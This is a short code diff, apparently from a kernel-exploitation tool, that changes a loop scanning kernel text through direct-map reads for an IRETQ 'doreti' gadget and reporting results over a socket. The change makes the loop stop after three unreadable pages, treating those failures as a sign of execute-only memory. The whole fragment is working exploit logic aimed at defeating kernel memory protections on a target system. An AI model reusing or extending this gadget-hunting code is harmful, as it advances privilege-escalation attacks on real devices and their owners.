@@ -5039,9 +5039,12 @@ broad_done:
                 }
 
                 /* Try to verify each via DMAP read (risky — XOM DMAP
-                 * reads may cause harder faults on some pages) */
+                 * reads may cause harder faults on some pages).
+                 * Bail out after 3 consecutive failures — if .text is
+                 * XOM, all remaining reads will also fail. */
                 uint64_t best_doreti = 0;
                 int best_score = 0;
+                int dmap_consec_fail = 0;
 
                 for (int i = 0; i < num_near_ptrs && i < 32; i++) {
                     uint64_t va = near_ptrs[i].text_va;
@@ -5059,6 +5062,7 @@ broad_done:
                         uint8_t code[8];
                         if (kernel_copyout(dmap_base + target_pa,
                                            code, sizeof(code)) == 0) {
+                            dmap_consec_fail = 0;
                             if (code[0] == 0x48 && code[1] == 0xcf) {
                                 int score = 1;
                                 send_response(sock, " -> IRETQ!");
@@ -5086,6 +5090,15 @@ broad_done:
                             }
                         } else {
                             send_response(sock, " -> DMAP unreadable\n");
+                            dmap_consec_fail++;
+                            if (dmap_consec_fail >= 3) {
+                                send_response(sock,
+                                    "  .text is XOM — skipping remaining "
+                                    "%d DMAP reads\n",
+                                    (num_near_ptrs < 32 ?
+                                     num_near_ptrs : 32) - i - 1);
+                                break;
+                            }
                         }
                     } else {
                         send_response(sock, " -> no text PA\n");
